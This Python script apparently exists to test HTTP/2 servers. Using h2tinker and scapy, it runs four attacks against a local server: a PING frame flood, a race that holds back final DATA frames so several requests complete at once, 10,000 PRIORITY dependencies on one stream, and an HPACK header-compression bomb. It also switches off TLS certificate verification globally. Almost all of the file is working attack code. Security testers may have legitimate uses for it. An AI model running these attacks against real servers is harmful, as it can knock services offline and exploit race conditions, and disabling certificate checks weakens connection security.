# import os
# import sslkeylog
import h2tinker as h2
import scapy.contrib.http2 as scapy
import ssl
import time

HOST = 'localhost'
PORT = 7002
METHOD = 'POST'
URL = '/hello/sayHello'

ssl._create_default_https_context = ssl._create_unverified_context


def ping_flood_attack():
    conn = h2.H2TLSConnection()
    conn.setup(HOST, PORT)

    # Create 1000 ping frames to dump into the socket at once
    pings = [h2.create_ping_frame() for _ in range(1000)]

    # Send 10 * 1000 PINGs
    for _ in range(100):
        for _ in range(10):
            conn.send_frames(*pings)
        time.sleep(1)

    print('Done sending')

    # Keep the connection open to force the server to respond
    conn.infinite_read_loop()


def last_frame_syncronisation_method_attack():
    conn = h2.H2TLSConnection()
    conn.setup(HOST, PORT)

    final_frames = []
    # Generate 10 valid client stream IDs
    for i in h2.gen_stream_ids(10):

        # Create request frames for POST /race
        req = conn.create_request_frames(METHOD, URL, i)
        # Remove END_STREAM flag from HEADERS frame which is always first
        req.frames[0].flags.remove('ES')
        # Send the request frames
        conn.send_frames(req)
        # Create the final DATA frame using scapy and store it
        final_frames.append(scapy.H2Frame(flags={'ES'}, stream_id=i) / scapy.H2DataFrame())

    # Sleep a little to make sure previous frames have been delivered
    time.sleep(5)
    # Send the final frames to complete the requests
    conn.send_frames(*final_frames)

    # Remain listening on the connection
    conn.infinite_read_loop()


def large_dependency_attack():
    conn = h2.H2TLSConnection()
    conn.setup(HOST, PORT)

    sids = h2.gen_stream_ids (10_001)
    # We will set all other streams dependant on the first stream
    dep_sid = sids.pop(0)
    # Create PRIORITY frames that make 10 000 streams depend on stream 1
    pris = [h2.create_priority_frame(sid, dep_sid) for sid in sids]
    # Send all frames at once
    conn.send_frames(*pris)
    # Keep the connection open
    conn.infinite_read_loop()


def hpack_bomb_attack():
    request_header_block = (
        ':method {}\n'
        ':path {}\n'
        ':scheme http\n'
        ':authority {}:{}\n'
    )
    # The first header block contains a single header that fills the header
    # table. To do that, we'll give it a single-character header name and a
    # 4063 byte header value. This will make it exactly the size of the header
    # table. It must come last, so that it evicts all other headers.
    # This block must be appended to either a request or response block.
    first_header_block = {'a': 'a' * 4063}
    # what headers should be indexed in server table
    indexed_headers = {'a'}

    for bomb_size in [(2**8), (2**13 - 20)]:
        conn = h2.H2TLSConnection()
        conn.setup(HOST, PORT)

        header_table = scapy.HPackHdrTable()
        # The second header "block" is actually a custom HEADERS frame body that
        # simply repeatedly refers to the first entry for 16kB. Each byte has the
        # high bit set (0x80), and then uses the remaining 7 bits to encode the
        # number 62 (0x3e), leading to a repeat of the byte 0xbe.
        header_references = [scapy.HPackIndexedHdr(b'\xbe') for _ in range(bomb_size)]

        req_str = request_header_block.format(METHOD, URL, conn.host, conn.port)
        req_str += '\n'.join(map(lambda e: '{}: {}'.format(e[0], e[1]), first_header_block.items()))

        # noinspection PyTypeChecker
        h2sec = header_table.parse_txt_hdrs(
            bytes(req_str.strip(), 'UTF-8'),
            stream_id=1,
            register=True,
            should_index=lambda x: x in indexed_headers
        )
        # h2sec.show()
        # print(header_table.get_idx_by_name('a'))  # index of header 'a'  must be 62
        # send request to server
        conn.send_frames(h2sec)
        # get response from server
        resp = conn.recv_frames()
        # for frame in resp:
        #     frame.show()
        for stream_id in [i for i in range(3, 250, 2)]:
            req_str = request_header_block.format(METHOD, URL, conn.host, conn.port)
            h2sec = header_table.parse_txt_hdrs(
                bytes(req_str.strip(), 'UTF-8'),
                stream_id=stream_id,
            )
            h2sec.frames[0].hdrs += header_references
            # h2sec.show()
            conn.send_frames(h2sec)

        # Keep the connection open
        conn.recv_frames()


if __name__ == '__main__':
    hpack_bomb_attack()
    time.sleep(1)
    large_dependency_attack()
    time.sleep(1)
    ping_flood_attack()
    time.sleep(1)
    last_frame_syncronisation_method_attack()




